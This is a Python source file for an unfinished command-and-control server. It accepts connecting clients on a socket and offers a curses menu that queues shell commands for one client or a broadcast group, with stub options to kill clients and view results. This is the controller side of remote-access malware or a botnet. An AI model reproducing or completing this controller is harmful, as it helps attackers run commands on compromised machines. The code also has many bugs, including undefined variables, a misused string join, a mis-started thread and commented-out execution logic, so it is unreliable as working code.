import socket
from command import *
from packetbuilder import *
import threading
import queue
from network_comms import *
import curses
import logging
from datetime import datetime
import time


class CommandData:
    command_type = -1
    command_identifier = 0  # Randomly generated Command ID
    command = None
    status = "Pending"
    return_value = None


class ClientData:
    client_id = None  # client ID by list location or randomly
    network = None  # NetworkComms to talk to the client
    last_seen = None
    commands = []  # List of commands that have been sent to the client
    waiting_commands = queue.Queue()  # Queue of commands waiting to go to the client

    def __init__(self, network):
        self.client_id = 0  # RANDOMIZE
        self.network = network
        self.last_seen = None
        self.commands = None
        self.waiting_commands = []


class Server:
    DEBUG_INFO = 0
    DEBUG_CRITICAL = 1
    DEBUG = DEBUG_INFO

    server_flag = 0

    STATE_WAITING = 0
    STATE_PACKET_LENGTH = 1
    STATE_READ_PACKET = 2
    STATE_DONE = 3
    MAX_CLIENTS_WAITING = 5

    clients = []  # Will hold all the ClientData for talking to the clients
    server_socket = None

    def connected_clients(self):
        count = 0
        string1 = ""
        for client in self.clients:
            count = count + 1
            string1.join(str(client.client_id) + " ")  # print all connected clients
        string1.join("there are " + str(count) + " connected clients")

    def dbg(self, msg, priority=0):
        if self.DEBUG <= priority:
            print(msg)

    def cli(self):
        w = curses.initscr()
        w.nodelay(False)

        def send_command_to_client():
            w.clear()
            w.addstr(str(self.connected_clients()))
            w.addstr("Enter Client ID  \n")
            input_client_id = w.getstr()
            w.clear()
            input_client_id = int(input_client_id)
            for client in self.clients:
                if client.client_id == input_client_id:
                    client.waiting_commands.append(comm_data.command)
                    break
            print("input is not legal")  # change to try catch or logs

        def menu():
            w.addstr("CNC status: ")
            if self.server_flag == 0:
                w.addstr("DOWN\n")
            elif self.server_flag == 1:
                w.addstr("UP\n")
            w.addstr(str(self.connected_clients()))
            w.addstr("\n\n[1] Send Command")
            w.addstr("\n[2] Kill Client")
            w.addstr("\n[3] Display Command Result\n")  # HOW MANY CLIENTS ARE CONNECTED

        while True:
            w.addstr('Press any key to load menu')
            w.getch()
            w.clear()
            w.refresh()
            menu()
            option = w.getch()  # BLOCKING - change to getch() non-blocking
            option = int(option)
            # DEAL WITH OTHER INPUTS
            if option == 49:  # SEND COMMAND
                w.clear()
                w.addstr("\n creating the command..\n")
                time.sleep(1)
                w.clear()
                comm_data = CommandData()  # creating command data
                return_val = None
                new_command = None  # creating a new empty command
                command_id = int(datetime.now().timestamp())  # generating command id
                args = []
                comm_data.command = new_command  # putting the empty command inside command data
                comm_data.command_identifier = command_id
                w.addstr("Which type of command to send?\n[1] Shell Execution Command\n")
                x = w.getch()
                w.clear()
                x = int(x)
                if x == 49:  # Shell execution command- CREATEING COMMAND
                    comm_data.command_type = 1
                    w.addstr(" Which shell command to run?\n")
                    shell_comm = w.getstr()
                  #shell_comm.decode('utf-8')
                   # comm_data.command = ShellExecuteCommand(1, command_id, args, shell_comm)
                    #return_val = comm_data.command.run() #decoded
                    #comm_data.return_value = return_val"""
                #if x == ord(2):
                #    Get arguments from user
                #    new_command = SomeOtherCommand(...)

                    w.addstr(" Would you like to send the command to a single client or a broadcast?\n[1] SINGLE\n[2] BROADCAST\n")
                    y = w.getch()
                    y = int(y)
                    if y == 49 :  # SINGLE- ENTER CLIENT ID
                        send_command_to_client()  # add command to the client's waiting commands queue
                         #  shell com will be exe in client

                    if y == 2: # BROADCAST- ENTER A LIST OF CLIENT IDS
                        w.addstr("How many clients do you want to send the command?")
                        num = w.getch()
                        num = int(num)
                        # IF MINUS OR LARGER THAN LENGTH ERROR
                        for i in range(num):
                            send_command_to_client()


            elif option == 2:  # KILL CLIENT
                w.addstr('two')
            elif option == 3:  # DISPLAY COMMAND RESULT
                w.addstr('three')
            else:
                break

            # w.addstr('data: %s\n' % value)
            w.addstr('Press any key to continue')
            w.getch()
            w.clear()
            w.refresh()

        curses.endwin()

    def accept_clients(self):
        while True:
            conn, address = self.server_socket.accept()  # accept new connection
            network = NetworkComms(conn, address)
            network.start()
            self.dbg("Connection from: " + str(address), self.DEBUG_CRITICAL)
            c = ClientData(network)
            self.clients.append(c)

    def run(self):

        host = socket.gethostname()
        port = 5001  # initiate port no above 1024

        self.server_socket = socket.socket()  # get instance
        self.server_socket.bind((host, port))  # bind host address and port together
        self.server_socket.listen(self.MAX_CLIENTS_WAITING)  # how many client the server can listen simultaneously
        self.dbg("Server is up.", self.DEBUG_CRITICAL)
        self.server_flag = 1
        threading.Thread(target=self.accept_clients, daemon=True).start()  # Start the client accepting thread
        threading.Thread(target=self.cli()).start()  # start cli thread

        while True:
            for client in self.clients:
                try:
                    while True:
                        packet = client.get_packet(block=False)
                        self.dbg("\nReceived packet from " + str(client.address) + ":\n\t" + str(packet), self.DEBUG_CRITICAL)

                        if isinstance(packet, GetCommandPacket):
                            client.send_packet(CommandPacket(new_command))
                        elif isinstance(packet, KeepAlivePacket):
                            pass
                            # Update the last seen
                            #client.last_seen = current time
                        elif isinstance(packet, StatusPacket):
                            pass
                            # client.commands[packet.command_id].status = packet.status

                except queue.Empty:
                    pass

        for client in clients:
            client.close()  # close the connection


if __name__ == '__main__':
    s = Server()
    s.run()

